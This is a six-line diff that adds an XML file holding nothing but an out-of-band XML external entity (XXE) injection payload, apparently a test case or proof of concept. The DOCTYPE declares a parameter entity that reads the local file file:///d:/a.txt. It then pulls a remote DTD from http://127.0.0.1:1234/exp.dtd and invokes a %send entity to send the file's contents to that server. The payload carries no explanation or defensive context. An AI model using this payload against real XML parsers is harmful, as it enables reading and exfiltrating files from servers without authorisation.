@@ -1,0 +1,6 @@
+<!DOCTYPE ANY[
+        <!ENTITY % file SYSTEM "file:///d:/a.txt">
+        <!ENTITY % remote SYSTEM "http://127.0.0.1:1234/exp.dtd">
+        %remote;
+        %send;
+        ]>
